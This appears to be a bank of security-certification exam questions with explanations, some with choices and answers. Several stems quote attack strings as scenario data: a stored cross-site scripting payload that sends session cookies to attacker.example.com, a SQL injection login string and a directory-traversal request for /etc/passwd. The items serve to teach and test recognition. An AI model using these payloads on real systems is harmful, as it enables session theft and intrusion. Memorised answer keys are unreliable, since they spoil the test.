exam_bank.explanation: A hash function turns input of any size into a fixed-length digest that cannot practically be reversed. A reversible function with a shared key describes symmetric encryption, not hashing.

exam_bank.stem: A company signs its software updates before releasing them. Which of the following does the digital signature provide for customers who verify it?
exam_bank.explanation: Verifying the signature shows the update has not been altered and came from the holder of the signing key, who cannot deny signing it. A signature does not encrypt the update, so it provides no confidentiality.

exam_bank.stem: Which of the following is an example of a key stretching algorithm used to protect stored passwords?
exam_bank.explanation: bcrypt applies many rounds of hashing to slow down brute-force attacks, which is key stretching. MD5 is a fast hash function, and speed is exactly what makes it a poor choice for storing passwords.

exam_bank.stem: Which of the following features of a blockchain makes it difficult to change a transaction after it has been recorded?
choices: Each block includes the hash of the previous block
Each block is encrypted with a single shared AES key
A central administrator approves every edit
All blocks are stored on a single server
exam_bank.answer: Each block includes the hash of the previous block
exam_bank.explanation: Because each block contains the previous block's hash, changing an old block breaks every link after it, which other participants would detect. A blockchain does not rely on a central administrator; it is decentralized.

exam_bank.stem: Cryptocurrency transactions are recorded in a shared record that anyone can view and verify, even though participants are identified only by addresses. Which of the following BEST describes this record?
exam_bank.explanation: An open public ledger is a record that anyone can read and verify, which is how public blockchains work. A permissioned database limits who can see and verify entries, so it is not open.

exam_bank.stem: Several suppliers in a supply chain want to confirm the origin and handling history of each shipment without depending on any single company to keep the records. Which of the following technologies BEST meets this need?
exam_bank.explanation: A blockchain gives all participants a shared, tamper-evident record that no single party controls. A certificate authority is a central trusted party, which is exactly what the suppliers want to avoid depending on.

exam_bank.stem: Which of the following is the PRIMARY reason a distributed ledger resists tampering by a single participant?
choices: Many participants hold copies and must agree on changes
All entries are encrypted with one master key
Only the entry's creator is able to read it
Entries are deleted once they have been verified
exam_bank.answer: Many participants hold copies and must agree on changes
exam_bank.explanation: Because many independent participants keep copies and must reach consensus, one participant cannot quietly rewrite history. A single master key would create a central weakness, which is the opposite of how a distributed ledger works.

exam_bank.stem: A certificate authority publishes a signed file, updated on a schedule, that names the serial numbers of certificates it has invalidated before their expiration dates. Which of the following is this file?
exam_bank.explanation: A certificate revocation list is the published list of revoked certificate serial numbers. OCSP also checks revocation, but it answers a query about one certificate at a time rather than publishing a full list.

exam_bank.stem: A browser trusts a bank's website certificate because the certificate chains up to a certificate already installed in the browser's trust store. Which of the following is that pre-installed certificate?
exam_bank.explanation: The root CA certificate in the trust store is the root of trust that every certificate in the chain leads back to. An intermediate CA certificate sits between the root and the website and is usually sent by the server, not pre-installed.

exam_bank.stem: An employee reports that the laptop holding the private key for their email signing certificate was stolen. Which of the following should the administrator do FIRST?
choices: Renew the certificate with the same key
Convert it to a wildcard certificate
exam_bank.explanation: Revoking the certificate tells relying parties to stop trusting anything signed with the stolen key. Renewing with the same key would keep the compromised key in use.

exam_bank.stem: Over 18 months, a defense contractor's network was quietly accessed using custom malware and previously unknown exploits. The attackers took weapons design files and made no demands. Which of the following threat actors is MOST likely responsible?
exam_bank.explanation: Long-term covert access, custom tools and zero-day exploits against military targets point to the funding and sophistication of a nation-state. Organized crime is also well resourced, but it normally seeks a quick financial return such as a ransom or the sale of data.

exam_bank.stem: Hours after a retailer announced it would stop selling a controversial product line, its public website was defaced with political slogans and a group claimed credit on social media. Which of the following threat actors is MOST likely responsible?
exam_bank.explanation: Hacktivists attack to promote a cause and usually claim credit publicly, often through defacement. A nation-state would rarely announce itself or choose such a visible, low-value action.

exam_bank.stem: A security analyst sees noisy scans and exploit attempts from a residential IP address. The traffic matches a popular point-and-click attack tool run with its default settings, and none of the exploits fit the company's systems. Which of the following BEST describes this threat actor?
exam_bank.explanation: An unskilled attacker relies on ready-made tools without understanding them, which produces noisy, poorly targeted activity. A hacktivist would have a cause and would normally pick targets and messages that serve it.

exam_bank.stem: To share large files with a vendor, a marketing team signed up for an unapproved cloud storage service using a corporate credit card. The IT department did not know the service was in use until an audit found it. Which of the following does this BEST describe?
exam_bank.explanation: Shadow IT is technology that staff adopt without IT approval, usually to get work done rather than to cause harm. An insider threat implies an insider who knowingly or carelessly misuses their access to harm the organization, which is not what happened here.

exam_bank.stem: The night after a system administrator was fired, someone used that administrator's still-active account to delete the company's backup sets. Nothing was taken and no demand was made. Which of the following motivations is MOST likely?
exam_bank.explanation: Destroying data right after being fired, with no theft or demand, points to revenge by a disgruntled former insider. Financial gain would normally involve stolen data or a ransom demand.

exam_bank.stem: A hospital's files were encrypted. The attackers demanded payment in cryptocurrency, offered a support portal to help the hospital pay, and have hit dozens of similar organizations this year. Which of the following threat actors is MOST likely responsible?
exam_bank.explanation: Organized crime groups run ransomware as a business, with support portals and repeated campaigns, all for financial gain. A nation-state is driven mainly by espionage or disruption, not by collecting ransoms from many victims.

exam_bank.stem: Which of the following attributes BEST distinguishes an insider threat from most other threat actors?
choices: It has the most funding and resources
It already has authorized internal access
It is driven only by political beliefs
It depends on freely available tools
exam_bank.answer: It already has authorized internal access
exam_bank.explanation: An insider threat is defined by being internal, with legitimate access that bypasses perimeter controls. The most funding and resources describes a nation-state, not an insider.

exam_bank.stem: An attacker stole a company executive's private emails and messaged the executive saying the emails would be published unless the executive approved a fake vendor invoice. Which of the following motivations BEST describes this attack?
exam_bank.explanation: Threatening to expose information unless the victim does what the attacker wants is blackmail. Data exfiltration was how the attacker got the emails, but the motivation is the threat that follows.

exam_bank.stem: An independent researcher finds a flaw in a company's mobile app, reports it through the company's bug bounty program and does not access any customer data. Which of the following motivations BEST describes the researcher?
exam_bank.explanation: Disclosing a flaw responsibly so that it can be fixed, without exploiting it, is an ethical motivation. Disruption/chaos would mean deliberately causing outages or damage, which the researcher avoided.

exam_bank.stem: During an armed conflict between two countries, attackers disabled one country's power grid and communications at the same time as military strikes began. Which of the following motivations is MOST likely?
exam_bank.explanation: Cyberattacks timed to support military operations against critical infrastructure are motivated by war. Philosophical beliefs drive hacktivists, who do not coordinate attacks with military strikes.

exam_bank.stem: An attacker kept undetected access to a foreign ministry's email server for months and copied diplomatic correspondence, but never changed or deleted anything. Which of the following motivations is MOST likely?
exam_bank.explanation: Quietly collecting sensitive government communications over a long period is espionage. Service disruption would mean degrading availability, but the attacker deliberately left everything working to stay hidden.

exam_bank.stem: An environmental group broke into a mining company's file server and gave internal documents about pollution to journalists. The group did not ask for money and said it wanted the public to know. Which of the following motivations BEST describes this attack?
exam_bank.explanation: Leaking documents to advance a cause, with no payment sought, is motivated by philosophical/political beliefs. Espionage is secret intelligence gathering for a sponsor, whereas this group published what it took.

exam_bank.stem: Several employees received text messages saying a package could not be delivered, with a link to "reschedule" that asks for their corporate login. Which of the following types of attacks is this?
exam_bank.explanation: Smishing is phishing delivered by SMS text message. Vishing uses voice calls, not text messages.

exam_bank.stem: A user got a phone call from someone claiming to be on the help desk. The caller said the account would be locked unless the user read back the MFA code just sent to their phone. Which of the following BEST describes this attack?
exam_bank.explanation: Vishing is social engineering carried out over a voice call, here combined with impersonation of the help desk. Smishing would arrive as a text message, not as a phone call asking for the code.

exam_bank.stem: The accounts payable team received an email from the CFO's real mailbox telling them to change a supplier's bank details before today's payment run. Later analysis showed that an attacker had logged in to the CFO's account. Which of the following BEST describes this attack?
exam_bank.explanation: Business email compromise uses a real, compromised business mailbox to trick staff into actions such as fraudulent payments. Typosquatting relies on a look-alike domain, but this email came from the CFO's genuine account.

exam_bank.stem: Attackers who wanted to breach several regional utility companies compromised an industry association forum that engineers at those utilities read every day, and used it to deliver malware. Which of the following types of attacks is this?
exam_bank.explanation: A watering hole attack compromises a legitimate site that the target group is known to visit. Typosquatting would mean registering a misspelled domain and waiting for users to mistype it, which is not what happened here.

exam_bank.stem: A company owns example.com. An analyst finds that someone has registered exmaple.com and set up a copy of the company's login page there to catch users who mistype the address. Which of the following BEST describes this technique?
exam_bank.explanation: Typosquatting registers a domain that differs from the real one by a common typing mistake. DNS poisoning would redirect users who typed the correct name, but these users reach the fake site only by mistyping it.

exam_bank.stem: A caller told the payroll clerk that he was from an external audit firm hired by the board and that a confidential review was due tomorrow. He used this story to ask for a list of employees and their salaries. Which of the following techniques did the caller use?
exam_bank.explanation: Pretexting is inventing a believable scenario to justify an unusual request. Shoulder surfing gathers information by watching someone's screen or keyboard, and it does not involve persuading the victim.

exam_bank.stem: A competitor spread a fake press release on social media claiming a company's product had been recalled for safety reasons. The competitor knew the claim was false. Which of the following BEST describes this activity?
exam_bank.explanation: Disinformation is false information spread on purpose to deceive. Misinformation is also false, but it is spread by people who believe it is true, which does not fit someone who knew the claim was false.

exam_bank.stem: Customers report a social media account and a website on an unrelated domain that use a bank's logo, colors and slogans. Both offer "account verification" and collect online banking details. Which of the following BEST describes this attack?
exam_bank.explanation: Brand impersonation copies a trusted organization's branding to make a fake presence look genuine. Typosquatting depends on a misspelling of the real domain, but this site uses an unrelated domain.

exam_bank.stem: A spam filter keeps missing a phishing campaign. Each email has no body text, only a single picture showing the fake invoice message and a payment address. Which of the following threat vectors is being used?
exam_bank.explanation: Putting the lure inside a picture is an image-based vector, used because text filters cannot read words in an image. A file-based vector would deliver a malicious document or executable, not just a picture of text.

exam_bank.stem: An attacker with access to a shared network drive replaced a commonly used spreadsheet template with a copy containing a malicious macro. Several users opened the template the next day. Which of the following threat vectors does this BEST represent?
exam_bank.explanation: The malicious code arrived inside a document that users opened, so this is a file-based vector. It is not message-based because no email, SMS or instant message delivered the file.

exam_bank.stem: Several USB flash drives labeled "Q3 Layoffs" were found in a company's parking lot. One employee plugged a drive into a work laptop, and the endpoint software then alerted on a hidden executable. Which of the following threat vectors was used?
exam_bank.explanation: Leaving USB drives where curious staff will find them uses removable devices as the threat vector. The drive did hold a malicious file, but what defines this attack is the device that delivered it.

exam_bank.stem: A remote code execution flaw is announced in the VPN software installed on every company laptop. The flaw can be exploited only on devices where that software is installed. Which of the following BEST describes this attack surface?
exam_bank.explanation: Software installed on the endpoint is client-based, so every laptop running the vulnerable VPN software is exposed. Agentless software runs without anything installed locally, such as a browser-based portal, which is not the case here.

exam_bank.stem: A vulnerability scan flags a file server that runs an operating system the vendor stopped supporting two years ago. The newest vulnerabilities on it have no patches available. Which of the following threat vectors does this server represent?
exam_bank.explanation: A system that no longer gets vendor patches is an unsupported system, and its known vulnerabilities will never be fixed. Open service ports may also exist on the server, but the issue described is the missing vendor support.

exam_bank.stem: A penetration tester logged in to the management page of several IP cameras using the username admin and the password admin printed in the manufacturer's manual. Which of the following attack surfaces did the tester exploit?
exam_bank.explanation: Credentials that ship from the manufacturer and are never changed are default credentials, and anyone can find them in the manual. The management port had to be open, but it was the unchanged password that allowed the login.

exam_bank.stem: An external scan of a web server shows the following: `21/tcp open ftp, 23/tcp open telnet, 443/tcp open https`. Only HTTPS is needed for the server's role. Which of the following attack surfaces does the scan reveal?
exam_bank.explanation: FTP and Telnet are listening but not needed, so they are unnecessary open service ports that add attack surface. The scan does not show whether default credentials are in use.

exam_bank.stem: Attackers broke into a managed service provider's remote monitoring platform and used it to push ransomware to the networks of dozens of the provider's customers. Which of the following threat vectors BEST describes how the customers were compromised?
exam_bank.explanation: Reaching customers through a trusted MSP's tools is a supply chain attack. A watering hole compromises a website that targets visit, but here the attackers used the provider's management access.

exam_bank.stem: A developer finds that an application copies user input into a fixed 64-byte array without checking its length. Long input crashes the program and can overwrite the return address on the stack. Which of the following vulnerabilities is this?
exam_bank.explanation: Writing more data than a fixed buffer can hold, so that it overwrites nearby memory such as a return address, is a buffer overflow. Memory injection places code into the memory of another running process, which is a different technique.

exam_bank.stem: A privileged program checks that a user may write to a temporary file and then opens the file a few milliseconds later. An attacker replaces the file with a link to a system file between the check and the open. Which of the following vulnerabilities is being exploited?
exam_bank.explanation: A TOC/TOU race condition happens when the resource changes between the moment it is checked and the moment it is used. A buffer overflow means writing past a memory boundary, and nothing like that happens here.

exam_bank.stem: An endpoint detection tool alerts that a malicious DLL was loaded into the address space of a running, legitimate explorer.exe process so that the attacker's code runs under that process's identity. Which of the following BEST describes this vulnerability?
exam_bank.explanation: Memory injection inserts code into the memory of a legitimate running process so that it runs hidden inside that process. A buffer overflow overruns a buffer within the same program and does not load code into another process, and a malicious update arrives through a vendor's update channel rather than being injected into a running process.

exam_bank.stem: Attackers compromised a software vendor's build server. The vendor's next routine update was signed with its real certificate, but it installed a backdoor on customers' systems. Which of the following BEST describes this vulnerability?
exam_bank.explanation: A malicious update is a legitimate-looking, properly signed update that carries harmful code. Side loading means installing software from outside the official channel, but this update came through the vendor's normal update process.

exam_bank.stem: A web server log shows this login request: `POST /login user=admin' OR '1'='1' -- &pass=x`. The attacker was then logged in as the first account in the database. Which of the following vulnerabilities was exploited?
exam_bank.explanation: The input closes the SQL string and adds a condition that is always true, so the database returns a match without a valid password. That is SQL injection. Cross-site scripting injects script into pages that other users' browsers run, not queries that the server runs.

exam_bank.stem: A user posted this comment on a support forum: `<script>new Image().src='https://attacker.example.com/c?'+document.cookie</script>`. Every visitor who views the thread now sends their session cookie to the attacker. Which of the following vulnerabilities does the forum have?
exam_bank.explanation: The forum stores the script and serves it to visitors without encoding it, which is stored cross-site scripting. Cross-site request forgery makes a logged-in browser send unwanted requests, but it does not run attacker script to steal cookies.

exam_bank.stem: Malware on a workstation survived a full disk wipe and operating system reinstall. Investigators found that it had been written into the motherboard's UEFI. Which of the following types of vulnerabilities did the attacker exploit?
exam_bank.explanation: Malware stored in UEFI lives in hardware firmware, so wiping the disk and reinstalling the operating system does not remove it. An operating system vulnerability would be removed by a clean reinstall.

exam_bank.stem: A network switch vendor has announced that after this month it will no longer sell, support or release security patches for a model the company still uses at 40 sites. Which of the following BEST describes the status of these switches?
exam_bank.explanation: End-of-life is the vendor's formal end of sales, support and patches for a product. Legacy describes old technology that an organization keeps running, but the key fact here is the vendor's announced end of support.

exam_bank.stem: On a shared virtualization host, code running in one guest virtual machine broke out of its guest and got access to the hypervisor and the other guests on the same host. Which of the following vulnerabilities was exploited?
exam_bank.explanation: VM escape means breaking out of a guest to reach the hypervisor or other guests. Resource reuse means data left behind in reassigned memory or storage, and it does not give control over the host.

exam_bank.stem: A cloud customer launches a new virtual machine and finds fragments of another tenant's database records in the disk space allocated to it. Which of the following vulnerabilities does this BEST describe?
exam_bank.explanation: Resource reuse happens when memory or storage is given to a new tenant without first being cleared, so earlier data stays readable. VM escape would require breaking out of the guest, but this customer only read space that was given to it.

exam_bank.stem: A researcher downloads thousands of customer invoices from a company's cloud object storage bucket without logging in. The bucket's access policy grants read access to everyone. Which of the following is the MOST likely cause?
exam_bank.explanation: A bucket policy that grants public read access is a misconfiguration, which is a common cloud-specific vulnerability. A zero-day is an unknown software flaw, but here the platform worked exactly as it was configured.

exam_bank.stem: A company found that network appliances bought through an unauthorized reseller had extra components on the circuit board that send traffic to an outside address. Which of the following supply chain risks does this represent?
exam_bank.explanation: The compromise is in the physical device as it was supplied, which is a hardware provider supply chain risk. A software provider risk involves tampered code or updates, not added circuit board components.

exam_bank.stem: A code review finds that an application encrypts stored credit card numbers with a cipher the developer designed, and the key is written directly in the source code. Which of the following types of vulnerabilities is this?
exam_bank.explanation: A home-made cipher and a key written into the code are cryptographic weaknesses that make the encryption easy to break. Misconfiguration refers to insecure settings, but here the encryption design itself is flawed.

exam_bank.stem: An employee downloaded an Android app package from a website and installed it on a company phone. The app is not available in the official app store, and the phone's operating system was not modified. Which of the following BEST describes what the employee did?
exam_bank.explanation: Side loading is installing an app from outside the official store. Jailbreaking removes the operating system's built-in restrictions, but the employee did not modify the operating system.

exam_bank.stem: MDM reports that an employee's iPhone is out of compliance. The employee ran a tool that exploited iOS to get root-level access and remove Apple's restrictions on the device. Which of the following BEST describes this?
exam_bank.explanation: Jailbreaking exploits iOS to remove manufacturer restrictions and get root-level access. Side loading only installs apps from outside the store, and on iOS jailbreaking is often what makes it possible in the first place.

exam_bank.stem: Which of the following BEST describes a vulnerability that attackers are exploiting before the vendor knows about it or has released a patch?
exam_bank.explanation: A zero-day vulnerability is exploited before the vendor knows about it or has a fix ready. End-of-life systems also go without patches, but that is because the vendor has stopped supporting them.

exam_bank.stem: Users report that files on a shared drive now end in .locked and will not open. A file named RESTORE-FILES.txt in every folder asks for payment in cryptocurrency. Which of the following types of malware is MOST likely involved?
exam_bank.explanation: Encrypted files with changed extensions and a payment note are clear signs of ransomware. A logic bomb stays hidden until a trigger condition is met and then runs a harmful action, but it does not demand payment to restore files.

exam_bank.stem: A user installed a free PDF converter from a download site. The converter works normally, but the firewall now shows the laptop keeping a connection open to 198.51.100.44 on port 4444. Which of the following types of malware is this?
exam_bank.explanation: A Trojan looks like useful software while running a hidden malicious payload, here a remote connection to the attacker. A worm spreads by itself across the network, but this program needed the user to install it.

exam_bank.stem: Within 20 minutes, hundreds of unpatched servers on different subnets began scanning port 445 and infecting each other. No users opened attachments or ran programs. Network utilization reached 95%. Which of the following types of malware is MOST likely involved?
exam_bank.explanation: A worm spreads by itself through a network vulnerability without user action, which causes fast spread and high resource consumption. A virus needs a user to run an infected file or program to spread.

exam_bank.stem: During a code review, an analyst finds a script added by a developer that deletes the payroll database if the developer's account is ever removed from the HR system. Which of the following BEST describes this script?
exam_bank.explanation: A logic bomb is code that runs a harmful action when a set condition is met, here the developer's account being removed. A Trojan pretends to be legitimate software that a user installs, but this is hidden code with a trigger condition.

exam_bank.stem: Traffic is leaving a server for an unknown host, but Task Manager and the endpoint antivirus show no unusual processes. An offline scan from bootable media finds a modified kernel driver that hides files and processes. Which of the following is MOST likely installed?
exam_bank.explanation: A rootkit changes the operating system, often at the kernel level, to hide itself from normal tools, which is why only an offline scan found it. Spyware collects information but does not usually hide itself at the kernel level.

exam_bank.stem: During a physical security sweep, a technician finds a small USB adapter between a shared workstation's keyboard cable and the computer. Several users of that workstation have since had their accounts compromised. Which of the following was MOST likely used?
exam_bank.explanation: An inline USB device between the keyboard and the computer is a hardware keylogger, which records every key pressed, including passwords. Spyware is software installed on the system, but this was a physical device.

exam_bank.stem: An employee's badge was used to open the server room at 2:14 AM while the employee was at home with the badge. Earlier that week, a stranger stood very close to the employee in a crowded elevator holding a bag. Which of the following attacks MOST likely occurred?
exam_bank.explanation: Copying a proximity badge's signal from close range with a hidden reader is RFID cloning, which explains the badge being used while the real card stayed with the employee. Tailgating means following someone through a door and would not create a badge log entry.

exam_bank.stem: Servers in a data center shut down after overheating. Investigators found that someone had logged in to the building's HVAC controller remotely and changed the cooling setpoint for the server room. Which of the following types of attacks does this BEST describe?
exam_bank.explanation: Attacking the environmental systems that equipment depends on, such as cooling, power or fire suppression, is an environmental attack. Brute force in a physical context means forcing a door, lock or barrier.

exam_bank.stem: A web server's link is saturated by 4,000-byte DNS responses from thousands of open resolvers. The server never sent any DNS queries. The attacker sent small queries to the resolvers with the server's IP address as the spoofed source. Which of the following attacks is this?
exam_bank.explanation: Small spoofed queries that produce large responses aimed at the victim are an amplified (and reflected) DDoS. DNS poisoning changes name resolution answers, but here the goal is to flood the link.

exam_bank.stem: Only users on the corporate network are sent to 198.51.100.23 when they browse to portal.example.com. The authoritative DNS records still show the correct address, 203.0.113.10, and users on other networks are not affected. Which of the following is the MOST likely cause?
exam_bank.explanation: When the authoritative records are correct but one resolver's users get a bad answer, that resolver's cache has been poisoned. Domain hijacking would change the registration or authoritative records and affect users everywhere.

exam_bank.stem: Users in the lobby report certificate warnings after connecting to the CorpGuest network. A wireless survey finds two access points broadcasting CorpGuest, one of them an unknown device with a much stronger signal. Which of the following attacks is MOST likely taking place?
exam_bank.explanation: An evil twin copies the SSID of a legitimate network to lure users into connecting so their traffic can be intercepted. A rogue access point is any unauthorized AP, but it does not have to copy an existing network's name, so evil twin is the more precise answer.

exam_bank.stem: An analyst reviews the ARP table on a workstation and sees: `10.0.0.1 at 00:1a:2b:3c:4d:5e` and `10.0.0.25 at 00:1a:2b:3c:4d:5e`. The address 10.0.0.1 is the default gateway, and 10.0.0.25 is another user's workstation. Which of the following attacks is MOST likely being used to gain an on-path position?
exam_bank.explanation: The gateway's IP address resolving to another workstation's MAC address shows ARP poisoning, which sends traffic through the attacker. MAC flooding overloads a switch's address table and does not change workstation ARP entries.

exam_bank.stem: After a workstation was compromised, the attacker used the password hash taken from its memory to log in to three file servers without ever cracking the password. Which of the following attacks does this BEST describe?
exam_bank.explanation: Reusing a captured hash or token to authenticate, as in pass-the-hash, is credential replay. Brute force tries to guess the password itself, which the attacker never needed to do.

exam_bank.stem: A web server log contains: `GET /download?file=../../../../etc/passwd HTTP/1.1 200`. Which of the following attacks does this log entry show?
exam_bank.explanation: The ../ sequences move up out of the web root to read a system file, which is directory traversal. SQL injection would put SQL syntax such as quotes or OR clauses in the parameter.

exam_bank.stem: A security analyst sees the following events with no matching change request: `Event 4732: Member jdoe added to group Administrators. Subject: jdoe`. The user jdoe is a standard user and had run an exploit against a local service minutes earlier. Which of the following attacks MOST likely occurred?
exam_bank.explanation: A standard user who exploits a local service and then adds themselves to Administrators has escalated privileges. Credential replay would mean logging in with someone else's captured credentials, but jdoe used their own account.

exam_bank.stem: While logged in to an online banking site, a user visited a forum page containing ``. The bank then processed a transfer the user never asked for. Which of the following attacks is this?
exam_bank.explanation: The forum page made the user's authenticated browser send a request to the bank, which is cross-site request forgery. Cross-site scripting would require script to run in the bank site's own pages, which did not happen.

exam_bank.stem: An intrusion detection system alerts that a client and a web server that both support TLS 1.3 have just negotiated SSL 3.0. A device on the path had changed the handshake messages. Which of the following attacks is MOST likely taking place?
exam_bank.explanation: A downgrade attack changes the negotiation so that both sides fall back to an older, weaker protocol that the attacker can break. A replay attack resends captured traffic and does not change which protocol version is chosen.

exam_bank.stem: Which of the following attacks relies on the high chance that two different inputs will produce the same hash value, which means far fewer attempts are needed than the hash length suggests?
exam_bank.explanation: A birthday attack uses the birthday paradox to find hash collisions in about the square root of the attempts that brute force would need. A rainbow table looks up precomputed hashes to recover passwords, not to find two inputs with the same hash.

exam_bank.stem: Authentication logs show one failed login each for 350 different user accounts within an hour, all from 203.0.113.50 and all using the password Winter2026!. No accounts were locked out. Which of the following attacks is MOST likely taking place?
exam_bank.explanation: Trying one common password against many accounts, slowly enough to avoid lockouts, is password spraying. Brute force tries many passwords against one account, which would quickly trigger a lockout.

exam_bank.stem: The help desk reports that the admin account is locked out. The log shows: `Failed login for admin from 203.0.113.7 (x40 in 1 minute)`, followed by `Account admin locked`. Which of the following attacks is MOST likely taking place?
exam_bank.explanation: Many rapid failed attempts against one account from one source are a brute force attack, and the account lockout is the indicator. Password spraying spreads a few attempts across many accounts to avoid exactly this kind of lockout.

exam_bank.stem: A user's account logged in from Chicago at 09:02 and logged out at 09:10. It then logged in from Singapore at 09:20. The user says they are in Chicago and did not use a VPN. Which of the following indicators does this BEST describe?
exam_bank.explanation: No one can travel from Chicago to Singapore in ten minutes, so this is impossible travel. Concurrent session usage would require both sessions to be active at once, but the Chicago session had ended first.

exam_bank.stem: While investigating a suspected intrusion, an analyst finds that a domain controller's security log has no entries between 01:00 and 03:00, and the first entry after the gap is `Event 1102: The audit log was cleared`. Which of the following indicators does this BEST describe?
exam_bank.explanation: A gap in the log followed by a log-cleared event shows missing logs, a sign that an attacker tried to hide their activity. Out-of-cycle logging means entries appearing at unusual times, not entries that have disappeared.

exam_bank.stem: A retailer wants its point-of-sale terminals to keep communicating with the payment processor, but it wants to stop them from reaching corporate workstations if one is compromised. Which of the following techniques BEST meets this goal?
exam_bank.explanation: Segmentation puts the terminals in their own network zone with controlled paths, so the traffic they need still flows while lateral movement is limited. Isolation would cut the terminals off completely, which would stop payments.

exam_bank.stem: During an incident, a technician moves an infected workstation to a quarantine VLAN that cannot reach any other network, so it can be analyzed without spreading malware. Which of the following mitigation techniques is being used?
exam_bank.explanation: Isolation fully separates a system so that it cannot talk to anything else, which is what a quarantine VLAN with no routes does. Segmentation divides a network into zones that can still talk to each other in controlled ways.

exam_bank.stem: A company's lobby kiosks must run only the check-in application and the browser. Every other executable, including any malware a visitor brings in, should be blocked from running. Which of the following BEST meets this requirement?
exam_bank.explanation: An application allow list lets only approved programs run and blocks everything else by default. A host-based firewall controls network traffic, not which programs can run.

exam_bank.stem: A network engineer adds this rule to a router: `deny tcp any host 10.1.1.20 eq 3389`. Which of the following mitigation techniques is the engineer using?
exam_bank.explanation: A rule that permits or denies traffic by address and port is an access control list entry. An application allow list controls which programs can run on a host, not which traffic a router forwards.

exam_bank.stem: A vendor has released a fix for a remote code execution flaw in the company's web servers, and the flaw is being actively exploited on the internet. Which of the following should the security team do FIRST to mitigate the risk?
exam_bank.explanation: Applying the vendor's fix removes the vulnerability, which is the most direct mitigation when a fix exists. Monitoring would only help detect exploitation, while the flaw would remain open.

exam_bank.stem: An audit finds that all help desk staff are members of Domain Admins, but their job only requires resetting passwords and unlocking accounts. Which of the following mitigation techniques would BEST address this finding?
exam_bank.explanation: Least privilege gives users only the permissions their job needs, so the help desk should get password reset rights, not full domain admin rights. Configuration enforcement keeps system settings at a baseline, which does not fix excessive user permissions.

exam_bank.stem: An organization deploys a tool that checks every server against an approved security baseline every hour and automatically changes back any setting that has drifted from it. Which of the following mitigation techniques does this BEST represent?
exam_bank.explanation: Configuration enforcement keeps systems at a defined baseline by automatically correcting drift. Monitoring would detect and report the drift without fixing it.

exam_bank.stem: Before old database servers are sent to a recycler, the IT team removes them from DNS and the directory, revokes their certificates and securely wipes their drives. Which of the following mitigation techniques is being performed?
exam_bank.explanation: Decommissioning is retiring systems securely, which includes removing their access and records and sanitizing their data before disposal. Isolation separates a system that is still running, but these servers are being retired permanently.

exam_bank.stem: Sales staff often lose laptops while traveling. The company wants to make sure that a thief who removes the hard drive cannot read the data stored on it. Which of the following hardening techniques BEST meets this goal?
exam_bank.explanation: Full-disk encryption makes the data on the drive unreadable without the key, even when the drive is removed. A host-based firewall protects a running system from network attacks and does nothing for data at rest on a stolen drive.

exam_bank.stem: A security engineer wants software on each server that detects suspicious behavior, such as unauthorized changes to system files or the registry, and blocks it automatically. Which of the following should the engineer install?
exam_bank.explanation: A host-based intrusion prevention system (HIPS) detects malicious activity on the host and blocks it. A HIDS gives the same visibility but only raises alerts, so it does not meet the requirement to block automatically.

exam_bank.stem: Employees often connect their laptops to hotel and airport Wi-Fi. The security team wants each laptop to block unsolicited inbound connections from other devices on whatever network it joins. Which of the following BEST meets this requirement?
exam_bank.explanation: A host-based firewall filters traffic on the laptop itself, so it protects the device on any network. A network access control list is enforced on network devices the company controls, which the hotel and airport networks are not.

exam_bank.stem: An unknown device was found plugged into a network jack in an unused conference room, where it had received an IP address on the corporate network. Which of the following hardening techniques would BEST prevent this in the future?
exam_bank.explanation: Disabling switch ports that are not in use stops anyone from simply plugging a device into an empty jack. A host-based firewall protects the host it is installed on and cannot stop an outside device from joining the network.

exam_bank.stem: Facilities is installing new network-connected HVAC controllers that cannot run endpoint security agents. Each controller ships with the same administrator login printed in its manual. Which of the following should be done FIRST before connecting the controllers to the network?
exam_bank.explanation: Default credentials are public, so they must be changed before a device goes on the network. Endpoint protection is not an option because the controllers cannot run agents, and it would not fix the known shared password anyway.

exam_bank.stem: A new server image includes media players, games and developer tools that the server's role does not need. The security team wants to reduce the image's attack surface before deploying it. Which of the following hardening techniques BEST meets this goal?
exam_bank.explanation: Removing software that the role does not need gets rid of the code that could be vulnerable, which directly reduces attack surface. A host-based firewall limits network access to services, but the unneeded programs and their flaws would still be on the server.

exam_bank.stem: A threat intelligence report describes a group with managers, recruiters and paid developers. It runs phishing campaigns, sells stolen card numbers on dark web markets and launders the proceeds through cryptocurrency mixers. Which of the following threat actors BEST fits this description?
exam_bank.explanation: A business-like structure focused on turning stolen data into money is typical of organized crime. A nation-state is also well organized, but its goals are usually espionage or strategic advantage rather than selling card numbers.

exam_bank.stem: A threat report uses the term advanced persistent threat (APT) to describe a group that has kept hidden access to several government networks for years. Which of the following threat actors is this term MOST commonly associated with?
exam_bank.explanation: APT describes long-term, stealthy, well-resourced campaigns, which is the hallmark of nation-state actors. Hacktivists may be persistent, but they usually seek publicity rather than years of quiet access.

exam_bank.stem: A town's library website was knocked offline for an afternoon. Police traced the attack to a teenager in another state who had downloaded a ready-made flooding script from a video tutorial and admitted he did not know how it worked. Which of the following BEST describes this threat actor?
exam_bank.explanation: Someone who runs downloaded tools without understanding them is an unskilled attacker. A hacktivist would act for a stated cause, and nothing in the scenario suggests one.

exam_bank.stem: A group named after an animal rights cause broke into a cosmetics company's web server and posted the company's internal product-testing reports online along with a manifesto. Which of the following threat actors is MOST likely responsible?
exam_bank.explanation: Publishing data with a manifesto to promote a cause is classic hacktivism. Organized crime would try to profit from the data, for example by selling it or demanding a ransom, rather than releasing it for free.

exam_bank.stem: To speed up testing, a developer set up a personal cloud server without telling IT and copied part of the production customer database to it. The developer meant no harm. Which of the following BEST describes this situation?
exam_bank.explanation: Shadow IT is technology used for work without the approval or knowledge of the IT department, usually with good intentions. The developer is not trying to profit or promote a cause, so organized crime and hacktivist do not fit.

exam_bank.stem: A database administrator who was passed over for promotion copied the full customer list to a personal USB drive the week before resigning to join a competitor. Which of the following threat actors BEST describes the administrator?
exam_bank.explanation: An employee who abuses authorized access to steal data is an insider threat. Shadow IT describes well-meaning use of unapproved technology, not deliberate theft.

exam_bank.stem: While sending a report, an HR assistant let the email client autocomplete the wrong recipient, and a spreadsheet of employee tax IDs went to an outside address. The assistant reported the mistake right away. Which of the following BEST describes this threat?
exam_bank.explanation: An insider who causes harm through a mistake, with no intent to do so, is an unintentional insider threat. A malicious insider acts on purpose, and nothing here suggests that.

exam_bank.stem: Which of the following BEST describes the main security problem created by shadow IT?
choices: The systems are not managed or monitored by the security team
The systems must run only open-source software
The users usually intend to sell company data to competitors for profit
The systems are always controlled by outside attackers
exam_bank.answer: The systems are not managed or monitored by the security team
